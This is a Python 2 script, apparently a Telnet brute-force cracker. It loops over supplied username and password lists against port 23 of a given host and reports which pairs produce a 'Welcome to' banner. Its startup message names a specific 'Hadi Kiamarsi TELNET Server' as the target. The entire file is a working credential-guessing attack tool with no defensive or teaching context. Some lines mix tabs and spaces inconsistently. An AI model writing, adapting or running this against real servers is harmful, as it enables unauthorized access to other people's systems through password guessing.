#!/usr/bin/python

import socket
import time
import sys

class PC:
        HEADER='\033[95m'
        OKBLUE='\033[94m'
        OKCYAN='\033[96m'
        OKGREEAN='\033[92m'
        WARNING='\033[93m'
        FAIL='\033[91m'
        ENDC='\033[0m'
        BOLD='\033[1m'
        UNDERLINE='\033[4m'

def chk_files(user,pwd):

	try:
		Uopen=open(user)
		U=Uopen.readlines()
	except:
		print "%s[E] %s%sError%s%s : <User-List> File Dont Exists Or Unreadable%s" % (PC.OKCYAN,PC.BOLD,PC.FAIL,PC.ENDC,PC.WARNING,PC.ENDC)
		exit(0)
	try:
		Popen=open(pwd)
		P=Popen.readlines()
	except:
		print "%s[E] %s%sError%s%s : <Pass-List> File Dont Exists Or Unreadable%s" % (PC.OKCYAN,PC.BOLD,PC.FAIL,PC.ENDC,PC.WARNING,PC.ENDC)
                exit(0)
	return U,P

def start(host,user,pwd):
	print "%s[*] Target :%s %s:23%s" %(PC.OKCYAN,PC.WARNING,str(host),PC.ENDC)
	print ""
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((str(host),23))
		s.close()
	except:
		print "%s[E] %s%sError%s%s : Connection Refused %s" % (PC.OKCYAN,PC.BOLD,PC.FAIL,PC.ENDC,PC.WARNING,PC.ENDC)
		exit(0)

	for U in user:
		for P in pwd:

			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((str(host),23))
			s.recv(2048)
			s.send(U.rstrip() + '\r\n')
			s.send(P.rstrip() + '\r\n')
			time.sleep(1)
			var=s.recv(2048)
			if 'Welcome to' in var:
				print "%s[+]%s %sLogin successful| %s%s:%s%s" % (PC.OKCYAN,PC.ENDC,PC.OKGREEAN,PC.BOLD,U.rstrip(),P.rstrip(),PC.ENDC)
			else:
				print "%s[-]%s %sLogin incorrect | %s%s:%s%s" % (PC.HEADER,PC.ENDC,PC.FAIL,PC.BOLD,U.rstrip(),P.rstrip(),PC.ENDC)


if (len(sys.argv) != 4):
	print "Usage : %s <Host> <User-List> <Pass-List>" % (sys.argv[0])
	exit(0)
else:
	print "%s[*]%s %sStart Cracker For%s (( %sHadi Kiamarsi TELNET Server%s ))%s" % (PC.OKCYAN,PC.ENDC,PC.OKBLUE,PC.FAIL,PC.WARNING,PC.FAIL,PC.ENDC)
	user,pwd = chk_files(sys.argv[2],sys.argv[3])
	start(sys.argv[1],user,pwd)
	print ""
	print "%s[*]%s %sFINISHED%s" % (PC.OKCYAN,PC.ENDC,PC.OKBLUE,PC.ENDC)
